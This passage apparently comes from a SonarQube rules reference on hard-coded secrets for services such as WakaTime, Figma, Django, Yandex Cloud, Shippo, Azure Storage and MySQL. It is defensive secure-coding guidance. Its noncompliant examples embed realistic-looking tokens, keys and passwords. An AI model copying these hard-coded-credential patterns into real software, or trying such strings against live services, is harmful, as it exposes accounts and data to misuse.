<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from clarifai_grpc.grpc.api.status import status_code_pb2

metadata = (('authorization','Key d819f799b90bc8dbaffd83661782dbb7'),)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
from clarifai_grpc.grpc.api.status import status_code_pb2

metadata = (('authorization',os.environ["CLARIFAI_API_KEY"]),)
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6764">
              secrets:S6764
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If attackers gain access to your WakaTime OAuth token or secret, they can potentially use it to make unauthorized requests to the WakaTime API on
your behalf.</p>
<h3>What is the potential impact?</h3>
<p>Attackers exploiting leaked WakaTime OAuth tokens or secrets can potentially access sensitive information, modify data, or perform actions on
behalf of the user without their consent. The exact capabilities of the attackers will depend on the authorizations the corresponding application has
been granted.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from rauth import OAuth2Service

service = OAuth2Service(
    client_id='d130uKF73fueZSCM9tUodIFN',
    client_secret='waka_sec_ez0kI3tQlYVvYSJOAjoI5n3PpyG69HQl91TZKFjSdb0X0XXgY7dahXiPpAhYL2kNxqDBzHuHNuzCPr5d', # Noncompliant
    name='wakatime',
    authorize_url='https://wakatime.com/oauth/authorize',
    access_token_url='https://wakatime.com/oauth/token',
    base_url='https://wakatime.com/api/v1/')
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
from rauth import OAuth2Service

service = OAuth2Service(
    client_id=os.environ['WAKA_CLIENT_ID'],
    client_secret=os.environ['WAKA_CLIENT_SECRET'],
    name='wakatime',
    authorize_url='https://wakatime.com/oauth/authorize',
    access_token_url='https://wakatime.com/oauth/token',
    base_url='https://wakatime.com/api/v1/')
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>WakaTime API Documentation - <a href="https://wakatime.com/developers#authentication">WakaTime API Authenticationb</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6765">
              secrets:S6765
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to a Figma personal access token, they might be able to compromise the data that is accessible to the linked Figma
account. By doing so, it might be possible for confidential data to be leaked by the attacker.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that may occur when a malicious entity manages to retrieve a leaked Figma personal access token.</p>
<h4>Compromise of business-critical data</h4>
<p>An attacker can use a personal access token to gain unauthorized access to your company’s Figma projects and designs. This can include confidential
client data, proprietary design assets, or any other intellectual property stored in Figma. With unauthorized access, the attacker can download and
share this sensitive data, potentially leading to data breaches, intellectual property theft, or other forms of unauthorized disclosure.</p>
<h4>Unauthorized actions in Figma environment</h4>
<p>With a leaked Figma personal access token, an attacker can perform various actions on behalf of your company within the Figma workspace. This can
include creating, modifying, or deleting projects, files, or team members. By impersonating authorized users, the attacker can manipulate your
company’s design assets or disrupt the design workflow. This can result in unauthorized changes and data loss.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import requests

token = 'figd_OLDXZWOP4fxW4c9ER0xzxRda96M-f0eFwZpFQjHJ'  # Noncompliant
response = requests.get('https://api.figma.com/v1/me', headers={
    'X-FIGMA-TOKEN': token,
    'Content-Type': 'application/json'
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import requests

token = os.getenv('FIGMA_PERSONAL_ACCESS_TOKEN')
response = requests.get('https://api.figma.com/v1/me', headers={
    'X-FIGMA-TOKEN': token,
    'Content-Type': 'application/json'
})
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>Figma Developers - <a href="https://www.figma.com/developers/api#access-tokens">Access tokens</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6687">
              secrets:S6687
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Django secret key leaks to an unintended audience, it can have serious security implications for the corresponding application. The secret key
is used to sign cookies and other sensitive data so that an attacker could potentially use it to perform malicious actions.</p>
<p>For example, an attacker could use the secret key to create their own cookies that appear to be legitimate, allowing them to bypass authentication
and gain access to sensitive data or functionality.</p>
<p>In the worst-case scenario, an attacker could be able to execute arbitrary code on the application and take over its hosting server.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p>In Django, changing the secret value is sufficient to invalidate any data that it protected. It is important to not add the revoked secret to the
<code>SECRET_KEY_FALLBACKS</code> list. Doing so would not prevent previously protected data from being used.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
SECRET_KEY = 'r&amp;lvybzry1*k+qq)=x-!=0yd5l5#1gxzk!82@ru25*ntos3_9^'
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os

SECRET_KEY = os.environ["SECRET_KEY"]
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.djangoproject.com/en/4.2/ref/settings/#std-setting-SECRET_KEY">Django documentation</a> - Settings - SECRET_KEY </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6760">
              secrets:S6760
            </a>
          </td>
          <td>
            <details>
              <p>Yandex Cloud is a complete platform that provides services such as virtual machines, cloud storage, API gateways, and private networks, to name a
few. In Yandex Cloud, users are authenticated using secret keys and tokens. If one of these secret is compromised, attackers will be able to perform
any action on behalf of the account or user associated with this secret.</p>
<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to a Yandex token or key, they might be able to compromise your Yandex Cloud environment. This includes control over
any applications or services that are running, as well as data that are managed by the account.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker manages to gain access to the Yandex Cloud environment, there exist several ways that they could seriously harm your organization.
Any data that is stored in the environment could be leaked, and the environment itself could even be tampered with.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Infrastructure takeover</h4>
<p>By obtaining a leaked secret, an attacker can gain control over your organization’s Yandex Cloud infrastructure. They can modify DNS settings,
redirect traffic, or launch malicious instances that can be used for various nefarious activities, including launching DDoS attacks, hosting phishing
websites, or distributing malware. Malicious instances may also be used for resource-intensive tasks such as cryptocurrency mining.</p>
<p>This can result in legal liability, but also increased costs, degraded performance, and potential service disruptions.</p>
<p>Furthermore, corporate Yandex Cloud infrastructures are often connected to other services and to the internal networks of the organization. Because
of this, cloud infrastructure is often used by attackers as a gateway to other assets. Attackers can leverage this gateway to gain access to more
services, to compromise more business-critical data and to cause more damage to the overall infrastructure.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import { Session, cloudApi, serviceClients } from '@yandex-cloud/nodejs-sdk';

const { resourcemanager: { cloud_service: { ListCloudsRequest } } } = cloudApi;

const session = new Session({ iamToken: 't1.7euelSbPyceKx87JqpuRl1qZiY-Ryi3rnpWaksrKaZqUppnLncmDnpeajZvl8_dZNAFl-e8ENXMH_t3z9xljfmT57wQ1cwf-.-LErty1vRh4S__VEp-aDnM5huB5MEfm_Iu1u2IzNgyrn0emiWDYA6rSQXDvzjE0O3HBbUlqoDeCmXYYInzZ6Cg' }); // Noncompliant
const cloudService = session.client(serviceClients.CloudServiceClient);

const response = await cloudService.list(ListCloudsRequest.fromPartial({
    pageSize: 100,
}));
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import { Session, cloudApi, serviceClients } from '@yandex-cloud/nodejs-sdk';

const { resourcemanager: { cloud_service: { ListCloudsRequest } } } = cloudApi;

const session = new Session({ iamToken: process.env.YANDEX_TOKEN });
const cloudService = session.client(serviceClients.CloudServiceClient);

const response = await cloudService.list(ListCloudsRequest.fromPartial({
    pageSize: 100,
}));
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p><a href="https://cloud.yandex.com/en/docs/iam/concepts/authorization/oauth-token">Yandex OAuth token</a></p>
<p><a href="https://cloud.yandex.com/en/docs/iam/concepts/authorization/iam-token">Yandex IAM token</a></p>
<p><a href="https://cloud.yandex.com/en/docs/iam/concepts/authorization/api-key">Yandex API key</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6777">
              secrets:S6777
            </a>
          </td>
          <td>
            <details>
              <p>Shippo is a multi-carrier shipping platform that helps businesses streamline their shipping processes. It provides a unified API and dashboard that
allows businesses to connect with multiple shipping carriers. Shippo API tokens are used for authentication and authorization purposes when making API
requests.</p>
<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Shippo API token is leaked, it can have several consequences:</p>
<h4>Financial Loss</h4>
<p>If the leaked API token is used to generate shipping labels or make shipping-related transactions, it can result in financial loss. Unauthorized
individuals may exploit the token to generate fraudulent labels or make unauthorized shipments, leading to additional shipping costs or potential
chargebacks. ==== Data Breach</p>
<p>If the leaked API token is associated with a user account that has access to sensitive customer or business data, it can result in a data breach.
This can lead to the exposure of personal information, shipping addresses, payment details, or other confidential data, potentially causing harm to
your customers and your business reputation.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Shippo.setApiKey('shippo_live_258d9b4c41a8cb88ca7fb4b12c65083f658435ac'); // Noncompliant

HashMap&lt;String, Object&gt; addressMap = new HashMap&lt;String, Object&gt;();
addressMap.put("name", "Mr. Hippo");
addressMap.put("company", "Shippo");
addressMap.put("street1", "215 Clayton St.");
addressMap.put("city", "San Francisco");
addressMap.put("state", "CA");
addressMap.put("zip", "94117");
addressMap.put("country", "US");
addressMap.put("phone", "+1 555 341 9393");
addressMap.put("email", "support@goshipppo.com");

Address createAddress = Address.create(addressMap);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Shippo.setApiKey(System.getenv("SHIPPO_API_TOKEN"));

HashMap&lt;String, Object&gt; addressMap = new HashMap&lt;String, Object&gt;();
addressMap.put("name", "Mr. Hippo");
addressMap.put("company", "Shippo");
addressMap.put("street1", "215 Clayton St.");
addressMap.put("city", "San Francisco");
addressMap.put("state", "CA");
addressMap.put("zip", "94117");
addressMap.put("country", "US");
addressMap.put("phone", "+1 555 341 9393");
addressMap.put("email", "support@goshipppo.com");

Address createAddress = Address.create(addressMap);
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6338">
              secrets:S6338
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Azure Storage Account Keys are used to authenticate and authorize access to Azure Storage resources, such as blobs, queues, tables, and files.
These keys are used to authenticate requests made against the storage account.</p>
<p>If an Azure Storage Account Key is leaked to an unintended audience, it can pose a significant security risk to your Azure Storage account.</p>
<p>An attacker with access to your storage account key can potentially access and modify all the data stored in your storage account. They can also
create new resources, delete existing ones, and perform other actions that can compromise the integrity and confidentiality of your data.</p>
<p>In addition, an attacker with access to your storage account key can also incur charges on your account by creating and using resources, which can
result in unexpected billing charges.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using Azure.Storage.Blobs;
using Azure.Storage;

class Example
{
    static void Main(string[] args)
    {
        string account = "accountname";
        string accountKey = "4dVw+l0W8My+FwuZ08dWXn+gHxcmBtS7esLAQSrm6/Om3jeyUKKGMkfAh38kWZlItThQYsg31v23A0w/uVP4pg=="; // Noncompliant
        StorageSharedKeyCredential sharedKeyCredential = new StorageSharedKeyCredential(account, accountKey);

        BlobServiceClient blobServiceClient = new BlobServiceClient(
            new Uri($"https://{account}.blob.core.windows.net"),
            sharedKeyCredential);
    }
}
</pre>
<h4>Compliant solution</h4>
<p>Using environment variables:</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System;
using Azure.Storage.Blobs;
using Azure.Storage;

class Example
{
    static void Main(string[] args)
    {
        string account = Environment.GetEnvironmentVariable("ACCOUNT_NAME");
        string accountKey = Environment.GetEnvironmentVariable("ACCOUNT_KEY");
        StorageSharedKeyCredential sharedKeyCredential = new StorageSharedKeyCredential(account, accountKey);

        BlobServiceClient blobServiceClient = new BlobServiceClient(
            new Uri($"https://{account}.blob.core.windows.net"),
            sharedKeyCredential);
    }
}
</pre>
<p>Using a passwordless approach, thanks to <a
href="https://learn.microsoft.com/en-us/azure/storage/blobs/storage-quickstart-blobs-dotnet?tabs=visual-studio%2Cmanaged-identity%2Croles-azure-portal%2Csign-in-azure-cli%2Cidentity-visual-studio#sign-in-and-connect-your-app-code-to-azure-using-defaultazurecredential">DefaultAzureCredential</a>:</p>
<pre>
using System;
using Azure.Storage.Blobs;
using Azure.Identity;

class Example
{
    static void Main(string[] args)
    {
        string account = Environment.GetEnvironmentVariable("ACCOUNT_NAME");
        var blobServiceClient = new BlobServiceClient(
                new Uri($"https://{account}.blob.core.windows.net"),
                new DefaultAzureCredential());
    }
}
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Microsoft Documentation - <a href="https://docs.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage?tabs=azure-portal">Manage
  storage account access keys</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6697">
              secrets:S6697
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords in MySQL are used to authenticate users against the database engine. They are associated with user accounts that are granted specific
permissions over the database and its hosted data.</p>
<p>If a MySQL password leaks to an unintended audience, it can have serious consequences for the security of your database, the data stored within it
and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a MySQL database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on the
purposes the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the MySQL instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>General-purpose MySQL log files contain information about user authentication. They can be used to audit malicious use of password-leak-affected
accounts.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<p><strong>Never hard-code secrets, not even the default values</strong></p>
<p>It is important that you do not hard-code secrets, even default values.</p>
<p>First, hard-coded default secrets are often short and can be easily compromised even by attackers who do not have access to the code base.</p>
<p>Second, hard-coded default secrets can cause problems if they need to be changed or replaced.</p>
<p>And most importantly, there is always the possibility to accidentally set default secrets for production services, which can lead to security
vulnerabilities and make production insecure by default.</p>
<p>To minimize these risks, it is recommended to apply the above strategies, even for the default settings.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
uri = "mysql://foouser:foopass@example.com/testdb"
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
user = os.environ["MYSQL_USER"]
password = os.environ["MYSQL_PASSWORD"]

uri = f"mysql://{user}:{password}@example.com/testdb"
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
